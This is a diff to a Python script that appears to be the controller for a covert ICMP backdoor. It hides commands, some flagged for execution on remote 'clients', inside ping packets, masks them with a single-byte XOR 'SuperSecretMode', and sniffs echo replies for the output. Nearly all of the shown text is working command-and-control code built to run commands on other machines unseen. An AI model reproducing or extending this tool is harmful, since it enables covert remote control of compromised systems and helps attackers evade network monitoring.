@@ -87,26 +87,27 @@ def send_command(arguments, clients, execute):
     except:
         print("[ERROR] Usage: send <ID> <message>")
 
-def encrypt(plaintext):
-    for i in range(4,len(plaintext)):
+def encrypt_decrypt(plaintext):
+    encrypted = ""
+    for i in range(len(plaintext)):
         encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
     return encrypted
 
 # Reduced redundency in options
 def send_over_icmp(clientip, command, execute):
+    encrypted = encrypt_decrypt(command)
     if execute:
         if SuperSecretMode:
-            clientcommand = "!!!$1" + command
+            clientcommand = "!!!$1" + encrypted
         else:
             clientcommand = "!!!01" + command         
     else:
         if SuperSecretMode:
-            clientcommand = "!!!$0" + command
+            clientcommand = "!!!$0" + encrypted
         else:
             clientcommand = "!!!00" + command
 
     if SuperSecretMode: 
-        encrypted = encrypt(clientcommand)
         evil = IP(dst=clientip)/ICMP(type=8)/(encrypted)
     else:
         evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
@@ -159,12 +160,14 @@ def listen(pkt):
     src = pkt[IP].dst 
     payload = str(pkt.payload)
     parsed = re.split('#{3}', payload)
-    
     if len(parsed) == 1:
         return
     else:
         command = parsed[1][:-1]
-        print(f"Recieved:\n\t{command} from {src}")
+        if command[0] == "$":
+            output = encrypt_decrypt(command[1:])
+            print(f"Recieved:\n\t{output} from {src}")
+        else: print(f"Recieved:\n\t{command} from {src}")
 
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
